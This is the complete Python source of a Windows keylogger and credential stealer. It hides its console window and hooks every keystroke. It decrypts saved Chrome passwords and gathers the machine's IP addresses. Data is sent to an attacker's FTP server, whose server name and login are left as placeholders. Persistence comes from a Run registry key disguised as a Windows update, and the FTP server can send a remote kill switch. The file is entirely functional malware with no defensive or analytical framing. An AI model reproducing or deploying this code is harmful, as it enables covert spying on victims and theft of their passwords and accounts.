import pythoncom, pyHook
import os
from os import getenv
from os.path import expanduser
import sys
import time
import shutil
import threading
import urllib,urllib2
from urllib2 import urlopen
import socket
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
import string
import random
import tempfile
from _winreg import *
import sqlite3
import win32crypt

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    sys.exit()
data=""
count=0
file_time = "win32update.txt"
control=0
computername=os.environ['COMPUTERNAME']

def get_publicip():
    error = "Error in public ip"
    try:
        ip = urlopen("http://ip.42.pl/raw").read()
        return ip
    except:
        return error

def get_privateip():
    error = "Error in private ip"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("gmail.com",80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return error

def getchromepass():
    file = getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    passlist = "\n"
    try:
        conn = sqlite3.connect(file)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        data = cursor.fetchall()
        if data>0:
            for result in data:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                passlist = passlist + "=====PASS FOUND======\n"+result[0]+"\n"
                passlist = passlist + "Username: "+result[1]+"\n"
                passlist = passlist + "Password: "+password+"\n"
    except:
        passlist = passlist + "[-] Pass chrome not found\n"
    return passlist

def random_ascii(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def getwritedir():
    tree = tempfile.gettempdir()
    return tree

def copytree(src, dst, symlinks=False, ignore=None):
    os.makedirs(dst)
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, symlinks, ignore)
        else:
            shutil.copy2(s, d)

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print """\n \n
    usage error"""
    return True

def addStartup():
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=getwritedir()+"\\updates\\win32update.bat"
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    SetValueEx(key2change, "Windows328664",0,REG_SZ, new_file_path)

def deleteStartup():
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    DeleteValue(key, "Windows328664")
    CloseKey(key)

def control_ftp():
    SERVER="SERVER"
    USERNAME="USERNAME"
    PASSWORD="PASSWORD"
    global computername
    SSL=0
    OUTPUT_DIR="./logs"
    try:
        if SSL==0:
            ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
        elif SSL==1:
            ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
        ft.cwd(OUTPUT_DIR)
        files = ft.nlst()
        for file in files:
            if file==computername+"-delete.txt":
                ft.delete(computername+"-delete.txt")
                ft.quit()
                return True
                break
            else:
                continue
        ft.quit()
        return False
    except:
        return False
        print "Error 2"

def log_ftp(i):
    global data,count,control,computername
    changedir()
    count+=1
    FILENAME=computername+"-logs-"+str(count)+"-"+random_ascii()+".txt"
    if control==0:
        data = "NAME: "+computername+"\n"+"Public ip: "+get_publicip()+ "\nPrivate ip: "+get_privateip()+"\nPort: 1568\n" + data
    elif control==1:
        data= "NAME: "+computername+"\n" + data
    fp=open(FILENAME,"a")
    fp.write(data)
    fp.close()
    data=""
    control=1
    try:
        SERVER="SERVER" #Specify your FTP Server address
        USERNAME="USERNAME" #Specify your FTP Username
        PASSWORD="PASSWORD" #Specify your FTP Password
        SSL=0 #Set 1 for SSL and 0 for normal connection
        OUTPUT_DIR="./logs" #Specify output directory here
        if SSL==0:
            ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
        elif SSL==1:
            ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
        ft.cwd(OUTPUT_DIR)
        fp=open(FILENAME,'rb')
        cmd= 'STOR' +' '+FILENAME
        ft.storbinary(cmd,fp)
        ft.quit()
        fp.close()
        os.remove(FILENAME)
    except:
        os.remove(FILENAME)
        print "Error 1"
    return True

def pass_ftp(passw):
    global computername
    FILENAME=computername+"-passw.txt"
    fp=open(FILENAME,"w")
    fp.write(passw)
    fp.close()
    try:
        SERVER="PASSWORD" #Specify your FTP Server address
        USERNAME="USERNAME" #Specify your FTP Username
        PASSWORD="PASSWORD" #Specify your FTP Password
        SSL=0 #Set 1 for SSL and 0 for normal connection
        OUTPUT_DIR="./logs" #Specify output directory here
        if SSL==0:
            ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
        elif SSL==1:
            ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
        ft.cwd(OUTPUT_DIR)
        fp=open(FILENAME,'rb')
        cmd= 'STOR' +' '+FILENAME
        ft.storbinary(cmd,fp)
        ft.quit()
        fp.close()
        os.remove(FILENAME)
    except:
        os.remove(FILENAME)
        print "Error 0"
    return True

def changedir():
    if os.getcwd() != getwritedir()+"\\updates":
        os.chdir(getwritedir()+"\\updates")

def create_file_time():
    global file_time
    changedir()
    if os.path.isfile(file_time) == False:
        fp=open(file_time,"a")
        fp.write("\n")
        fp.close()

def verify_file_time():
    global file_time
    changedir()
    st=os.stat(file_time)
    mtime=st.st_mtime
    difference = time.time() - mtime
    if difference > 5000:
        deleteStartup()
        sys.exit()

def createdirandsendfirstinformation():
    if os.path.isdir(getwritedir()+"\\updates") == False:
        info = "Public ip: "+get_publicip()+ "\nPrivate ip: "+get_privateip()+"\nPort: 1568\n"+getchromepass()
        pass_ftp(info)
        copytree(".",getwritedir()+"\\updates\\", False, None)
        addStartup()
        sys.exit()

def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    if len(data)>100:
        t = threading.Thread(target=log_ftp, args=(1,))
        t.start()
    return True
    
def main():
    hide()
    createdirandsendfirstinformation()
    create_file_time()
    verify_file_time()
    if control_ftp()==True:
        deleteStartup()
        sys.exit()
    while True:
        obj = pyHook.HookManager()
        obj.KeyDown = keypressed
        obj.HookKeyboard()
        pythoncom.PumpMessages()
    return True

if __name__ == '__main__':
    main()

